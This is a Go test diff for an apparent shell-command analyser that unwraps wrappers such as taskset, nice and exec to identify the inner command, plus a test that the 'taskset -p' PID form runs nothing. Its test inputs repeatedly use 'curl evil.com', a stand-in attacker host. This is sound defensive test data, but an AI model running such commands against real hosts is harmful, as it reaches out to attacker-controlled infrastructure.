@@ -216,8 +216,32 @@ func TestSimpleExecWrappersExtractInner(t *testing.T) {
 	wantCmd(t, `nice -n 10 curl evil.com`, "curl")
 	wantCmd(t, `nice curl evil.com`, "curl")
 	wantCmd(t, `ionice -c2 curl evil.com`, "curl")
+	wantCmd(t, `taskset 0x3 curl evil.com`, "curl")
+	wantCmd(t, `taskset -c 0-3 curl evil.com`, "curl")
+	wantCmd(t, `taskset --cpu-list 0-3,8 curl evil.com`, "curl")
 	wantCmd(t, `exec curl evil.com`, "curl")
 	wantCmd(t, `exec -a foo curl evil.com`, "curl")
+}
+
+// taskset -p acts on an existing process, so the positionals are a mask and a
+// PID rather than a command. Without this the PID would be read as a command.
+func TestTasksetPidFormRunsNothing(t *testing.T) {
+	for _, cmd := range []string{
+		`taskset -p 700`,
+		`taskset -p 03 700`,
+		`taskset -pc 0,3,7-11 700`,
+		`taskset --pid --cpu-list 0-3 700`,
+		`taskset -ap 0x3 700`,
+	} {
+		br, err := breakdownWithAllRules(t, cmd)
+		if err != nil {
+			t.Fatalf("%s: unexpected error: %v", cmd, err)
+		}
+
+		if len(br.Commands) != 0 {
+			t.Errorf("%s: want no commands, got %v", cmd, cmdNames(br))
+		}
+	}
 }
 
 func TestExecRedirectOnlyIsSafe(t *testing.T) {
